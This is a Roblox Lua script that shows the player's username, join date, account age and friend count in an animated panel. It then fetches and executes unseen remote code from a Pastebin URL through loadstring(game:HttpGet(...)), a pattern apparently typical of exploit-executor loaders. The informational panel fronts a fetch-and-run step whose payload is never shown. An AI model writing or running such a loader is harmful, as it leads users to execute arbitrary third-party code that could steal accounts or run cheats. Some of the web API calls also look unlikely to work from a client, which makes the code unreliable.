-- Services
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer

-- Main function
local function showPlayerInfo()
    -- Fetch user info
    local success, userInfo = pcall(function()
        local userId = Players:GetUserIdFromNameAsync(LocalPlayer.Name)
        local userData = HttpService:GetAsync("https://users.roblox.com/v1/users/"..userId)
        return HttpService:JSONDecode(userData)
    end)

    if not success then
        warn("Failed to get user info")
        return
    end

    -- Fetch friends count
    local friendsCount = 0
    local successFriends, friendsData = pcall(function()
        local friendsUrl = "https://friends.roblox.com/v1/users/"..userInfo.id.."/friends?limit=1"
        local data = HttpService:GetAsync(friendsUrl)
        return HttpService:JSONDecode(data)
    end)
    if successFriends then
        friendsCount = friendsData.count or 0
    end

    -- Calculate account age
    local createdDate = userInfo.created
    local year, month, day = string.match(createdDate, "(%d+)-(%d+)-(%d+)")
    local createdTime = os.time({year = tonumber(year), month = tonumber(month), day = tonumber(day)})
    local accountAge = math.floor((os.time() - createdTime)/(60*60*24)) -- days

    -- GUI Setup
    local screenGui = Instance.new("ScreenGui")
    screenGui.ResetOnSpawn = false
    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 350, 0, 200)
    frame.Position = UDim2.new(0.5, -175, 0.5, -100)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 0
    frame.AnchorPoint = Vector2.new(0.5, 0.5)
    frame.Parent = screenGui

    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 15)
    UICorner.Parent = frame

    -- Title
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, -20, 0, 40)
    title.Position = UDim2.new(0, 10, 0, 10)
    title.BackgroundTransparency = 1
    title.Text = "Player Info"
    title.TextScaled = true
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.Font = Enum.Font.GothamBold
    title.Parent = frame

    -- Info Labels
    local function createLabel(text, yPos)
        local lbl = Instance.new("TextLabel")
        lbl.Size = UDim2.new(1, -20, 0, 30)
        lbl.Position = UDim2.new(0, 10, 0, yPos)
        lbl.BackgroundTransparency = 1
        lbl.Text = text
        lbl.TextColor3 = Color3.fromRGB(200, 200, 200)
        lbl.Font = Enum.Font.Gotham
        lbl.TextScaled = true
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.Parent = frame
        return lbl
    end

    local usernameLabel = createLabel("Username: "..LocalPlayer.Name, 60)
    local joinLabel = createLabel("Join Date: "..createdDate, 95)
    local ageLabel = createLabel("Account Age: "..accountAge.." days", 130)
    local friendsLabel = createLabel("Connections: "..friendsCount, 165)

    -- Fancy Tween Animation
    frame.Position = UDim2.new(0.5, -175, -0.5, -100) -- Start off-screen
    local tweenInfo = TweenInfo.new(1, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
    local tween = TweenService:Create(frame, tweenInfo, {Position = UDim2.new(0.5, -175, 0.5, -100)})
    tween:Play()

    -- Wait then load main script
    delay(5, function()
        local exitTween = TweenService:Create(frame, TweenInfo.new(1, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Position = UDim2.new(0.5, -175, -0.5, -100)})
        exitTween:Play()
        exitTween.Completed:Wait()
        screenGui:Destroy()
        -- Load main script
        loadstring(game:HttpGet("https://pastebin.com/raw/ppgDv958"))()
    end)
end

-- Run the function
showPlayerInfo()
